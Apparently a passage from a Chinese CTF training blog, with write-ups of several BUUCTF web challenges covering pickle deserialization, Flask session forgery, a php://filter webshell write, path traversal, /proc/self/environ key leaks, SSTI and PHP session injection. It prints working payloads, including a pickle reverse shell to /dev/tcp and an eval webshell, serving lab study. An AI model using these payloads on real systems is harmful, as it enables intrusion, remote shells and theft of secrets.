<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;*******&quot;</span></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index_handler</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;u&#x27;</span>):</span><br><span class="line">        u = pickle.dumps(User())</span><br><span class="line">        session[<span class="string">&#x27;u&#x27;</span>] = u</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;/file?file=index.js&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/file&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_handler</span>():</span></span><br><span class="line">    path = request.args.get(<span class="string">&#x27;file&#x27;</span>)</span><br><span class="line">    path = os.path.join(<span class="string">&#x27;static&#x27;</span>, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path) <span class="keyword">or</span> os.path.isdir(path) \</span><br><span class="line">            <span class="keyword">or</span> <span class="string">&#x27;.py&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;.sh&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> path <span class="keyword">or</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;disallowed&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        content = fp.read()</span><br><span class="line">    <span class="keyword">return</span> content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=(<span class="params"><span class="string">&#x27;GET&#x27;</span>,</span>)</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_handler</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        u = session.get(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(u, <span class="built_in">dict</span>):</span><br><span class="line">            u = b64decode(u.get(<span class="string">&#x27;b&#x27;</span>))</span><br><span class="line">        u = pickle.loads(u)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;uhh?&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> u.is_admin == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;welcome, admin&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;who are you?&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">80</span>, debug=<span class="literal">False</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>1.熟悉的<code>secret_key</code> 加上flask框架直接用以前的脚本进行session伪造就好了</p>
<p>2.定义了一个<code>User</code>类，可知我们要伪造的内容为<code>uname:admin is_admin:1</code></p>
<p>3.利用python的pickle的dumps和loads进行序列化和反序列化</p>
<p>所以可以利用<code>__reduce__</code>方法进行命令执行</p>
<p>exp：（最好在linux python2环境</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>flask-session 伪造</code></p>
<p><img src="https://img-blog.csdnimg.cn/6fbbf284a9dd44b5ae70566c1e1609c5.png" alt="img"></p>
<p>根据形式将上面exp得到的内容放进去并利用密钥进行加密</p>
<p><img src="https://img-blog.csdnimg.cn/9ec455b9804040658958df717eda7b64.png" alt="img"></p>
<p>最后抓包，访问<code>/admin</code>修改session，在vps上进行监听</p>
<p>就可以啦</p>
<p><img src="https://img-blog.csdnimg.cn/ea28f9e9c0f0436a9fb9f091bde072d0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle Store</h4><ul>
<li>python pickle序列化</li>
</ul>
<p>一看题目就能知道是python序列化和反序列化了，可以查看到session，进行base4解码之后是乱码，但是我们可以直接进行反序列化</p>
<p><img src="https://img-blog.csdnimg.cn/e1e89602e4394c93b38d79a2b5237715.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> _pickle</span><br><span class="line"><span class="built_in">print</span>(_pickle.loads(base64.b64decode(<span class="string">&#x27;gAN9cQAoWAUAAABtb25leXEBTZABWAcAAABoaXN0b3J5cQJdcQNYFAAAAFl1bW15IHNtw7ZyZ8Olc2d1cmthcQRhWBAAAABhbnRpX3RhbXBlcl9obWFjcQVYIAAAADQ2NGZiNTE5ZWNjZDkwMDM3Y2E4MDczMTlkNDU3ODZkcQZ1Lg==&#x27;</span>)))</span><br><span class="line"><span class="comment">#&#123;&#x27;money&#x27;: 400, &#x27;history&#x27;: [&#x27;Yummy smörgåsgurka&#x27;], &#x27;anti_tamper_hmac&#x27;: &#x27;464fb519eccd90037ca807319d45786d&#x27;&#125;</span></span><br></pre></td></tr></table></figure>

<p>可以猜测后端存在base64解码之后的反序列化，那么直接上exp：（上题的exp仍然适用 在linux python2中</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.6</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">User = <span class="built_in">type</span>(<span class="string">&#x27;User&#x27;</span>, (<span class="built_in">object</span>,), &#123;</span><br><span class="line">    <span class="string">&#x27;uname&#x27;</span>: <span class="string">&#x27;test&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;is_admin&#x27;</span>: <span class="number">1</span>,</span><br><span class="line">    <span class="string">&#x27;__repr__&#x27;</span>: <span class="keyword">lambda</span> o: o.uname,</span><br><span class="line">    <span class="string">&#x27;__reduce__&#x27;</span>: <span class="keyword">lambda</span> o: (os.system,(<span class="string">&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/ip/7777 0&gt;&amp;1&#x27;&quot;</span>,))</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">u = pickle.dumps(User())</span><br><span class="line"><span class="built_in">print</span>(b64encode(u).decode())</span><br></pre></td></tr></table></figure>

<p>在vps上监听，抓包</p>
<p><img src="https://img-blog.csdnimg.cn/5cdab4bd0ffa443b870b763111c8d9d2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="WMCTF2020-Web-Check-in-2-0"><a href="#WMCTF2020-Web-Check-in-2-0" class="headerlink" title="[WMCTF2020]Web Check in 2.0"></a>[WMCTF2020]Web Check in 2.0</h4><ul>
<li>php</li>
</ul>
<p><a href="https://github.com/wm-team/WMCTF2020-WriteUp/blob/master/WMCTF%202020%E5%AE%98%E6%96%B9WriteUp.md">参考</a></p>
<p>源码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//PHP 7.0.33 Apache/2.4.25</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$sandbox</span> = <span class="string">&#x27;/var/www/html/sandbox/&#x27;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]);</span><br><span class="line">@mkdir(<span class="variable">$sandbox</span>);</span><br><span class="line">@chdir(<span class="variable">$sandbox</span>); </span><br><span class="line">var_dump(<span class="string">&quot;Sandbox:&quot;</span>.<span class="variable">$sandbox</span>); <span class="comment">#当前路径</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;content&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="variable">$content</span>)) <span class="comment"># ban了php伪协议用到的一些关键词</span></span><br><span class="line">         <span class="keyword">die</span>(<span class="string">&#x27;hacker&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(file_exists(<span class="variable">$content</span>)) </span><br><span class="line">        <span class="keyword">require_once</span>(<span class="variable">$content</span>);</span><br><span class="line">    file_put_contents(<span class="variable">$content</span>,<span class="string">&#x27;&lt;?php exit();&#x27;</span>.<span class="variable">$content</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>审计代码之后可以想到利用点在于<code>file_put_contents($content,&#39;&lt;?php exit();&#39;.$content);</code>，之前做过类似的使用<code>php://filter</code>过滤器的base64，直接把前面的exit()绕过，但是这次base64被ban了，只能利用其他过滤器</p>
<p><a href="https://segmentfault.com/a/1190000018991087#item-2">php://filter</a>在这里可以找到可利用的</p>
<blockquote>
<p><img src="https://img-blog.csdnimg.cn/c9041e2332f9497fa28888e250d60e10.png" alt="img"></p>
</blockquote>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php://filter/zlib.deflate|string.tolower|zlib.inflate|?&gt;&lt;?php%0deval($_GET[&#x27;cmd&#x27;]);?&gt;/resource=a.php</span><br></pre></td></tr></table></figure>

<p>之后利用已知的路径去访问<code>a.php</code>，利用shell得到flag</p>
<h4 id="蓝帽杯-2021-One-Pointer-PHP（未学完）"><a href="#蓝帽杯-2021-One-Pointer-PHP（未学完）" class="headerlink" title="[蓝帽杯 2021]One Pointer PHP（未学完）"></a>[蓝帽杯 2021]One Pointer PHP（未学完）</h4><p>给了源码：</p>
<p><code>add_api.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=unserialize(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line">	<span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line">		setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="variable">$user</span>=<span class="keyword">new</span> User;</span><br><span class="line">	<span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line">	setcookie(<span class="string">&quot;data&quot;</span>,serialize(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先审计代码，可以知道我们要绕过<code>if($count[]=1)</code></p>
<p>这里利用int溢出就可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// $c=9223372036854775806;</span></span><br><span class="line"><span class="comment">// $count[++$c]=1;</span></span><br><span class="line"><span class="comment">// if($count[]=1)&#123;</span></span><br><span class="line"><span class="comment">//     $c+=1;</span></span><br><span class="line"><span class="comment">//     var_dump($count);</span></span><br><span class="line"><span class="comment">// &#125;else&#123;</span></span><br><span class="line"><span class="comment">//     system(&#x27;whoami&#x27;);</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// use User as GlobalUser;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$count</span> = <span class="number">9223372036854775806</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $data  = &#x27;O%3A4%3A%22User%22%3A1%3A%7Bs%3A5%3A%22count%22%3Bi%3A1%3B%7D&#x27;;</span></span><br><span class="line"><span class="comment">// var_dump(unserialize(urldecode($data)));</span></span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> User()));</span><br></pre></td></tr></table></figure>

<p>抓包修改cookie之后，get传<code>backdoor</code>，但是发现好多函数和类都被ban了，之后去参考别的师傅的wp，但是发现好多要学习的点（</p>
<p><img src="https://img-blog.csdnimg.cn/9f377ede4e1d4feca2282f2a033ef63c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第二周学习</title>
    <url>/2022/01/22/%E9%9B%86%E8%AE%AD%E7%AC%AC%E4%BA%8C%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="virink-2019-files-share"><a href="#virink-2019-files-share" class="headerlink" title="virink_2019_files_share"></a>virink_2019_files_share</h4><p>打开靶机，是一个魔方游戏，看源码有hint说flag在<code> f1ag_Is_h3re</code>，一开始去js文件里面看了一下，没有发现平时游戏题目中可以利用的点</p>
<p><img src="https://img-blog.csdnimg.cn/0aa9f312cdf643f58d774a23c746b609.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>发现有一个<code>uploads/favicon.ico </code>，直接访问<code>./uploads/</code>，存在两个文件都分别抓一下包，在preview里面发现get传的参，猜测会不会存在文件包含</p>
<p>这里Server是<code>openresty</code>，百度之后发现是基于nginx，那么直接试着看nginx的配置文件啥的</p>
<span id="more"></span>

<p><img src="https://img-blog.csdnimg.cn/de73e1269d4744359168e12261db4aa8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>尝试之后发现有些字符被ban掉了，可以自己试着能不能通过重复等绕过，绕过过滤之后还要进行目录穿越</p>
<p><img src="https://img-blog.csdnimg.cn/c9a2378f738b4ff8991084c09967d7fb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>那么，想要其他文件就直接在后面改吧，根据提示直接去<code>f1ag_Is_h3re</code>找flag</p>
<p>payload1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?f=....//....//....//....//....//....//f1ag_Is_h3rere</span><br></pre></td></tr></table></figure>

<p>但是显示该文件不存在，看了别的师傅的wp</p>
<p>在后面还要加上flag（为什么呢，虽然能理解f1ag_Is_h3re可能是个目录名，但是为什么能想到呢，可能还是一种思维吧</p>
<p>最终payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">....//....//....//....//....//....//f1ag_Is_h3rere//flag</span><br></pre></td></tr></table></figure>

<h4 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h4><ul>
<li>经典买东西</li>
<li>session伪造</li>
<li>/proc/self</li>
<li>/environ</li>
</ul>
<p>靶机主页面，经典要用钱买flag，刚好差一块钱，先都看看吧：</p>
<p><img src="https://img-blog.csdnimg.cn/00bc169409ea4ac0a56d906a37dbd376.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>抓包，发现又是session伪造，所以我们可以修改balance为1337，这样就可以购买flag了，但是我们不知道密钥呀！！</p>
<p>再次回到首页，康康源码，抓抓包</p>
<p>最后点击图片可以下载，抓包康康；这种样子不禁让人觉得有文件包含漏洞，用<code>/etc/passwd</code>测试是否存在文件包含漏洞</p>
<p><img src="https://img-blog.csdnimg.cn/fb66bfaf3f5b4dd1aa5ef8c6b73d22ce.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>目录穿越之后实现了文件包含</p>
<p><img src="https://img-blog.csdnimg.cn/7bec789db81d4ddcb8cc4b7565765c00.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>看师傅的<a href="https://blog.csdn.net/weixin_44037296/article/details/111469361">wp</a>，学到的新知识：</p>
<p>（因为这里用到了flask session伪造，所以应该是python的环境</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/proc/self 指向当前的进程</span><br><span class="line">/environ 当前进程的变量环境信息</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/eceb6ce2b2474078bcac2ad4581fab88.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>得到密钥那就直接伪造，修改session，购买flag吧</p>
<p><img src="https://img-blog.csdnimg.cn/d494bbde6fab49a2827d5f31b4a235d7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<h4 id="watevrCTF-2019-Supercalc"><a href="#watevrCTF-2019-Supercalc" class="headerlink" title="[watevrCTF-2019]Supercalc"></a>[watevrCTF-2019]Supercalc</h4><ul>
<li>flask session伪造</li>
<li><code>&#123;&#123;config&#125;&#125;</code></li>
</ul>
<p>打开靶机，是一个计算器</p>
<p><img src="https://img-blog.csdnimg.cn/7fe2d938ac4740dbbf6b73dffa42b5ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>测试几次之后，抓包发现session，kali中解密之后可以确定是flask session，我们可以进行伪造，既然已经知道是flask框架，然后执行的代码又是<code>&#123;&#39;1+1&#39;&#125;</code>这样的，那么可以猜测是ssti注入</p>
<p>但是同样的，重点还是找到密钥</p>
<p>这里利用<code>&#123;&#123;config&#125;&#125;</code>，不过这里必须要是再前面的运算报错的情况下才能实现，这或许和后端的check有关（？可以去看一下源码</p>
<p>利用注释绕过判断，但是在执行过程中又会执行，得到密钥</p>
<p><img src="https://img-blog.csdnimg.cn/fa93f28b618e4da69963ee06220ff5cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>之后直接打payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;ls\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<p>发现有flag.txt</p>
<p><img src="https://img-blog.csdnimg.cn/dd7c034961e74355863ed4d98a377507.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAYW1ldXU=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="img"></p>
<p>直接cat就好啦</p>
<p>payload2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&quot;history&quot;:[&#123;&quot;code&quot;:&quot;__import__(\&quot;os\&quot;).popen(\&quot;cat flag.txt\&quot;).read()&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;,&#123;&quot;code&quot;:&quot;1 + 1&quot;&#125;]&#125;</span><br></pre></td></tr></table></figure>

<h4 id="b01lers2020-Scrambled"><a href="#b01lers2020-Scrambled" class="headerlink" title="[b01lers2020]Scrambled"></a>[b01lers2020]Scrambled</h4><ul>
<li>python脚本编写</li>
</ul>
<p>简单来说，transmissions两边的<code>kxkxkxkxsh</code>都不会改变，而中间的<code>0b29</code>指的是第29位是b，第28位是0，直接写脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://efbfb7c1-8fd8-4ed9-9a4d-0e065c79e0e3.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line">res = requests.session()</span><br><span class="line">r = res.get(url, headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>: <span class="string">&#x27;frequency=1; transmissions=kxkxkxkxsh0b29kxkxkxkxsh&#x27;</span>&#125;)</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">100</span></span><br><span class="line">fflag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>): <span class="comment"># 这里最好是要100此，难免会出现重复的transmissions导致最后的结果错误</span></span><br><span class="line">    time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    r = res.get(url)</span><br><span class="line">    cookies = r.cookies</span><br><span class="line">    ans = <span class="built_in">str</span>(cookies[<span class="string">&#x27;transmissions&#x27;</span>])</span><br><span class="line">    ans = ans.replace(<span class="string">&#x27;kxkxkxkxsh&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;%7B&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>).replace(<span class="string">&#x27;%7D&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ans)</span><br><span class="line">    index = ans[<span class="number">2</span>:]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)] = ans[<span class="number">1</span>]</span><br><span class="line">    flag[<span class="built_in">int</span>(index)-<span class="number">1</span>] = ans[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-------loading-------&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    fflag += <span class="built_in">str</span>(flag[i])</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(fflag)</span><br></pre></td></tr></table></figure>

<h4 id="最后："><a href="#最后：" class="headerlink" title="最后："></a>最后：</h4><p>学到的新知识点：</p>
<p><strong>0x01:</strong></p>
<p><code>/proc/self</code> 指向当前进程</p>
<p><code>/environ</code> 指向进程的环境变量信息</p>
<p>做了好多flask session伪造</p>
<p><strong>0x02:</strong></p>
<p>利用<code>&#123;&#123;config&#125;&#125;</code>获取环境变量</p>
<p>flask框架ssti注入</p>
<p><strong>———————–TBC—————————</strong></p>
]]></content>
      <categories>
        <category>集训</category>
      </categories>
      <tags>
        <tag>web</tag>
        <tag>buu刷题</tag>
      </tags>
  </entry>
  <entry>
    <title>集训第四周学习</title>
    <url>/2022/02/16/%E9%9B%86%E8%AE%AD%E7%AC%AC%E5%9B%9B%E5%91%A8%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<h4 id="HarekazeCTF2019-Easy-Notes"><a href="#HarekazeCTF2019-Easy-Notes" class="headerlink" title="[HarekazeCTF2019]Easy Notes"></a>[HarekazeCTF2019]Easy Notes</h4><ul>
<li>session反序列化</li>
</ul>
<p>session在php中的存储方式为为 <code>键名+竖线+经过serialize函数序列处理的值</code> ，这就可以伪造 <code>admin</code> 了</p>
<p>exp：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">URL = <span class="string">&#x27;http://e2cec884-8829-4092-a14e-072d64de4f5f.node4.buuoj.cn:81/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># login as sess_</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    sess.post(URL + <span class="string">&#x27;login.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span>: <span class="string">&#x27;sess_&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a crafted note</span></span><br><span class="line">    sess.post(URL + <span class="string">&#x27;add.php&#x27;</span>, data=&#123;</span><br><span class="line">        <span class="string">&#x27;title&#x27;</span>: <span class="string">&#x27;|N;admin|b:1;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;body&#x27;</span>: <span class="string">&#x27;hello&#x27;</span></span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make a fake session</span></span><br><span class="line">    r = sess.get(URL + <span class="string">&#x27;export.php?type=.&#x27;</span>).headers[<span class="string">&#x27;Content-Disposition&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line">    sessid = re.findall(<span class="string">r&#x27;sess_([0-9a-z-]+)&#x27;</span>, r)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(sessid)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># get the flag</span></span><br><span class="line">    r = requests.get(URL + <span class="string">&#x27;?page=flag&#x27;</span>, cookies=&#123;</span><br><span class="line">        <span 